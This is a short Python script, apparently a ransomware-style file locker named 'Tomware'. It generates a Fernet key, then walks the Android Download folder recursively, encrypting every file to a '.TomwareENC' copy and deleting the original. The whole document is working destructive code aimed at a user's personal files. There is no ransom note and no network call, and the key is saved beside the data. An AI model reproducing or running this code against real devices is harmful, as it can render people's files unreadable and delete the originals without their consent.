import os
from cryptography.fernet import Fernet
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# Function to generate encryption key if it doesn't exist
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    print(Fore.GREEN + "[✓] Encryption key has been created and saved as 'secret.key'.")

# Function to load encryption key from file
def load_key():
    return open("secret.key", "rb").read()

# Function to encrypt a file and delete the original file
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)

        # Save encrypted file with .TomwareENC extension
        encrypted_file_path = file_path + '.TomwareENC'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Remove the original file after encryption
        os.remove(file_path)

        print(Fore.GREEN + f"[✓] '{file_path}' has been encrypted into '{encrypted_file_path}' and the original file has been deleted.")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to encrypt '{file_path}': {e}")

# Function to encrypt all files in a folder
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            # Skip the key file so it doesn't get encrypted
            if file_path.endswith('secret.key') or file_path.endswith('.TomwareENC'):
                continue
            encrypt_file(file_path, key)

# Run encryption process
if __name__ == "__main__":
    # Check if the key exists, if not create a new key
    if not os.path.exists("secret.key"):
        generate_key()

    # Load the encryption key
    key = load_key()

    # Folder to encrypt (adjust path as needed)
    folder_to_encrypt = "/storage/emulated/0/Download"  # Path to folder Download on Android

    # Start the encryption process
    encrypt_folder(folder_to_encrypt, key)
